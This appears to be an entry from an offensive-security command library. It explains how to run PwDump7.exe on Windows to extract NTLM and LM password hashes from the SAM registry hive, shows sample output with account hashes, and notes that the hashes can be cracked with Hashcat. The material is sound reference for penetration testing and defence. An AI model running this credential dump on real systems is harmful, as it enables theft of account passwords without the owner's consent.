---
id: b22038c2-b5b3-4b3a-ad8d-cf423feab193
name: pwdump7-dump-ntlm-lm-hashes-local-windows
type: command
executor: cmd
data: PwDump7.exe
output: >-
  C:\Users\BOB\Desktop>PwDump7.exe

  Pwdump v7.1 - raw password extractor

  Author: Andres Tarasco Acuna

  url: http://www.514.es


  Administrator:500:NO
  PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::

  Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::

  BOB:1000:NO PASSWORD*********************:81ABA903C80B8F4DAAD5225F7D996FBC:::


  HomeGroupUser$:1002:NO
  PASSWORD*********************:E47E1AB30238D34A8A7BA62278ECA4C7:::
created_at: '2019-09-26T22:51:06.757922+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - credential-access
  - hash-dumping
verified: true
validated: true
---

# pwdump7-dump-ntlm-lm-hashes-local-windows

## Command

```cmd
PwDump7.exe
```

## Description

This command executes PwDump7 on a local Windows system to extract NTLM and LM hashes from the SAM and SYSTEM registry hives without requiring administrative privileges in some scenarios, using filesystem drivers to access the files.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This command has no parameters; it runs with default behavior to dump local hashes. | N/A |

## Examples

### Basic Usage

```cmd
PwDump7.exe
```

### Advanced Usage

No additional options are typically needed, but run from an elevated command prompt for full access to protected files.

## Expected Output

Description of what output to expect when the command runs successfully.

```
C:\Users\BOB\Desktop>PwDump7.exe
Pwdump v7.1 - raw password extractor
Author: Andres Tarasco Acuna
url: http://www.514.es

Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::
Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
BOB:1000:NO PASSWORD*********************:81ABA903C80B8F4DAAD5225F7D996FBC:::

HomeGroupUser$:1002:NO PASSWORD*********************:E47E1AB30238D34A8A7BA62278ECA4C7:::
```

The output lists usernames, RIDs, LM hashes (often empty or default), and NTLM hashes in a format suitable for cracking with tools like Hashcat.

## Related

- [[Related Procedure: Dump Local Windows Hashes]]
- [[Tool: PwDump7]]
